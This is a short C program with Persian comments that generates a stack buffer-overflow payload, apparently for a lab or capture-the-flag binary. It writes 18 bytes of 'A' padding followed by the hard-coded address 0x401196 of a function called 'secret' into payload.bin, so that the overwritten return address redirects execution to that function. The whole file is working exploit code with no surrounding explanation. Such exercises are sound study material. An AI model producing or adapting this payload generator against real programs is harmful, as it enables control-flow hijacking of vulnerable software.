#include <stdio.h>
#include <string.h>

int main() {
    char buffer[100];
    int offset = 18; // جایگاه برگشت در حافظه که پیدا کردی
    void (*secret_addr)() = (void(*)())0x401196;  // آدرس تابع secret

    // پر کردن buffer با 'A'
    memset(buffer, 'A', offset);

    // جایگزین کردن آدرس تابع secret در ادامه buffer
    memcpy(buffer + offset, &secret_addr, sizeof(secret_addr));

    // اضافه کردن null terminator (اختیاری، بسته به برنامه)
    buffer[offset + sizeof(secret_addr)] = '\0';

    // چاپ به صورت باینری داخل فایل
    FILE *fp = fopen("payload.bin", "wb");
    fwrite(buffer, 1, offset + sizeof(secret_addr), fp);
    fclose(fp);

    return 0;
}

